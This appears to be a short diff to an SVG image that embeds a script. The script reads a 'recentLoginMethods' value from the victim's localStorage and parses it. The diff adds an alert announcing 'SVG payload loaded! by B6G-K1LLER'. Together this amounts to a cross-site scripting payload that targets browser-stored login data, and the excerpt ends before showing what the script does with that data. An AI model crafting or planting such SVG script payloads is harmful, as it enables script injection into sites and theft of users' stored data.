@@ -1,6 +1,9 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
   <script type="application/ecmascript">
     <![CDATA[
+      // Simple pop-up to show that the code has loaded
+      alert("SVG payload loaded! by B6G-K1LLER");
+
       var recentLoginMethods = localStorage.getItem('recentLoginMethods');
       if (recentLoginMethods) {
         var loginMethods = JSON.parse(recentLoginMethods);
